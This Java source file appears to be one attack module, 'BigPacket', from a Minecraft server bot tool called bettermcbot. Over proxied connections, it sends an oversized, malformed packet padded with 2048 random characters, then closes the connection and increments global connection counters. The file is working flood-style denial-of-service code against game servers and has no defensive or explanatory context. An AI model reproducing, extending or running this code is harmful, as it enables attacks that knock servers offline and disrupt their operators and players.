package ml.dima_dencep.bettermcbot.methods;

import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import java.io.IOException;
import java.security.SecureRandom;
import ml.dima_dencep.bettermcbot.NettyBootstrap;
import ml.dima_dencep.bettermcbot.ProxyLoader;

public class BigPacket implements Method {
   SecureRandom r = new SecureRandom();
   String lol = "";
   final int a = 2048;

   public BigPacket() {
      for(int i = 1; i < this.a + 1; ++i) {
         this.lol = String.valueOf(this.lol) + String.valueOf((char)(this.r.nextInt(125) + 1));
      }

   }

   public static void writeVarInt(ByteBufOutputStream out, int paramInt) throws IOException {
      while((paramInt & -128) != 0) {
         out.writeByte(paramInt & 127 | 128);
         paramInt >>>= 7;
      }

      out.writeByte(paramInt);
   }

   public void accept(Channel channel, ProxyLoader.Proxy proxy) {
      ByteBuf b = Unpooled.buffer();
      ByteBufOutputStream out = new ByteBufOutputStream(b);

      try {
         writeVarInt(out, 2049);
         out.write(0);
         out.writeUTF(this.lol);
         out.close();
      } catch (IOException var6) {
         var6.printStackTrace();
      }

      channel.writeAndFlush(b);
      ++NettyBootstrap.integer;
      ++NettyBootstrap.totalConnections;
      channel.close();
   }
}
